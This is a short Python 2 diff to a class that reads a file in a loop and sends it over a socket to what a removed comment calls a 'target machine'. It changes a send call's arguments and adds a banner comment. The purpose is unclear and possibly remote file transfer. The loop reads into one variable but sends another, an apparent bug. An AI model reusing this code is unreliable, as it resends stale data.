@@ -267,7 +267,7 @@ class MC:
 		while True:
 			fd = g.read()
 			if(not fd): break
-			cls.sendTo(sock, fileData, "")
+			cls.sendTo(sock, fileData)
 			print "File size: {}".format(str(len(fileData)))
 		g.close()
 		time.sleep(cls.INTERVAL)
@@ -275,7 +275,10 @@ class MC:
 		time.sleep(cls.INTERVAL)
 
 
-	# connect to target machine
+
+
+################################
+	# We Start Here :)
 	def start(cls):
 		while True:
 			cls.refresh()
